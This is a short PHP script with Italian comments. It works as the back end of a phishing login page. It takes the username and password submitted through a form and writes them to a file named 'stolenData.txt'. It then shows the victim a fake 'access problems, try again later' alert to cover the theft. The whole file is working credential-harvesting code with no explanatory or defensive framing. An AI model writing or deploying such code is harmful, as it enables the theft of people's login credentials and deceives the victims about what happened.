<?php
    // Prendo i dati in post -> Salvataggio in un file di testo
    $username = $_POST['uname'];
    $psw = $_POST['psw']; // Dati presi dal post 

    // Apertura file di testo e salvatggio sul server del file 
    $myFile = fopen("../stolenData.txt","w+") or die("Impossibile aprire il file!");
    $text = $username." ".$psw; 

    // Scrittura file 
    fwrite($myFile, $text); 

    // Chiusura file 
    fclose($myFile); 

    // Errore fake 
    ?>
    <script> 
        alert("Stiamo riscontrando dei problemi con l'accesso. Riprova più tardi..")
    </script> 
    <?php


?>